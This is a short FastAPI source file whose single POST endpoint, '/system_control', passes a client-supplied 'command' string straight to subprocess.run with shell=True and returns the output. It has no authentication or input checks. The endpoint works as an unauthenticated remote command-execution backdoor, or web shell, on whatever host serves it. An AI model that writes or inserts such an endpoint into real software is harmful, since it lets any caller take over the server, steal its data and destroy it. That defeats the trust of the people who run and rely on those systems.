from fastapi import APIRouter
from pydantic import BaseModel
import subprocess

router = APIRouter()

class Command(BaseModel):
    command: str

@router.post("/system_control")
def system_control(cmd: Command):
    result = subprocess.run(cmd.command, shell=True, text=True, capture_output=True)
    return {"stdout": result.stdout, "stderr": result.stderr}

